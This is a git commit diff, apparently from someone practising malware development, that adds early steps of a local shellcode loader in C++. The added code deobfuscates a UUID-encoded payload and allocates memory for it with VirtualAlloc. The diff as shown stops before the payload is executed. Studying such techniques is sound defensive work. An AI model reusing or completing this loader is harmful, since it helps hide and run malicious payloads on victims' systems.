35df1a6c0d01d0211ed92c0ae175e9a61b6406c5
adh1ka <hafizhadhi27@gmail.com>
2025-07-31 20:45:19 +0700

    ngelanjut main dikit

--- local-exec-shellcode/local-exec-shellcode/local-exec-shellcode.cpp
+++ local-exec-shellcode/local-exec-shellcode/local-exec-shellcode.cpp
@@ -6,7 +6,24 @@ int main()
     PBYTE pDeobfuscatedPayload = NULL;
     SIZE_T sDeobfuscatedSize = NULL;
 
-    
+    printf("[i] Injecting shellcode the local process of pid : %d \n", GetCurrentProcessId());
+    printf("[#] Press <Enter> to decrypt..");
+    getchar();
+
+    printf("[i] Decrypting...");
+    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
+        return -1;
+    }
+    printf("[+] DONE! \n");
+    printf("[i] Deobfuscated Payload at : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);
+
+    printf("[#] Press <Enter> To Allocate ... ");
+    getchar();
+    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (pShellcodeAddress == NULL) {
+        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
+    }
+
 
     return 0;
 
